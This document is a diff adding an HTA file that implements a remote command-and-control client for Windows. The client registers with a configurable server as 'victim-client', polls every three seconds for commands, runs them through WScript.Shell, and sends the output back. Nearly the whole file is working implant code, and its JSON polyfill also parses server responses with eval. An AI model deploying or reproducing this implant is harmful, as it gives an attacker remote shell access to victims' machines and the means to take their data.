@@ -1,0 +1,129 @@
+<html>
+<head>
+  <title>HTA Client</title>
+  <script>
+    // JSON Polyfill for legacy environments
+    if (typeof JSON === "undefined") {
+      JSON = {
+        stringify: function (obj) {
+          var t = typeof obj;
+          if (t === "object") {
+            if (obj) {
+              var isArray = Object.prototype.toString.call(obj) === "[object Array]";
+              var json = [];
+              for (var key in obj) {
+                if (obj.hasOwnProperty(key)) {
+                  var value = obj[key];
+                  var valueType = typeof value;
+                  if (valueType === "string") {
+                    value = '"' + value + '"';
+                  } else if (valueType === "object" && value !== null) {
+                    value = JSON.stringify(value);
+                  }
+                  json.push((isArray ? "" : '"' + key + '":') + String(value));
+                }
+              }
+              return (isArray ? "[" : "{") + String(json) + (isArray ? "]" : "}");
+            }
+            return "null";
+          }
+          return String(obj);
+        },
+        parse: function (text) {
+          return eval("(" + text + ")");
+        }
+      };
+    }
+  </script>
+</head>
+<body>
+  <div>
+    <textarea rows="100" columns="500" id="logs" style="width: 800px; height: 500px"></textarea>
+  </div>
+  <script>
+    // Server URL configuration
+    var serverUrl = "http://localhost:3000"; // Update this to match your server
+    var clientId = "victim-client";
+
+    function logData(data) {
+        var logs = document.getElementById("logs");
+        logs.value += data + "\n";
+    }
+
+    // Utility function for XHR requests
+    function sendXhr(method, endpoint, data, callback) {
+      try {
+        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+        xhr.open(method, serverUrl + "/" + endpoint, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            if (callback) {
+              callback(JSON.parse(xhr.responseText));
+            }
+          }
+        };
+        
+        var payload = data ? JSON.stringify(data) : null;
+        logData(endpoint + payload);
+        xhr.send(payload);
+      } catch (e) {
+        logData("XHR Error: " + e.message);
+      }
+    }
+
+    // Register the client with the server
+    function registerClient() {
+      sendXhr("POST", "register", { id: clientId }, function (response) {
+        logData("Client registered: " + JSON.stringify(response));
+      });
+    }
+
+    // Execute commands using WScript.Shell
+    function executeCommand(command) {
+      try {
+        var shell = new ActiveXObject("WScript.Shell");
+        var exec = shell.Exec(command);
+        var output = "";
+        while (!exec.StdOut.AtEndOfStream) {
+          output += exec.StdOut.ReadLine() + "\n";
+        }
+        return output;
+      } catch (e) {
+        logData("Command execution error: " + e.message);
+        return e.message;
+      }
+    }
+
+    // Poll the server for commands
+    function listenForCommands() {
+      setInterval(function () {
+        sendXhr("GET", "commands?clientId=" + clientId, null, function (command) {
+          if (command && command.cmd) {
+            logData("Received command: " + command.cmd);
+            var result = executeCommand(command.cmd);
+            sendCommandOutput(result);
+          }
+        });
+      }, 3000); // Poll every 3 seconds
+    }
+
+    // Send command output back to the server
+    function sendCommandOutput(output) {
+      sendXhr("POST", "commandOutput", { clientId: clientId, output: output }, function (response) {
+        logData("Command output sent: " + JSON.stringify(response));
+      });
+    }
+
+    // Initialize the client
+    function init() {
+      logData("Initializing HTA client...");
+      registerClient();
+      listenForCommands();
+    }
+
+    // Start the client
+    init();
+  </script>
+</body>
+</html>
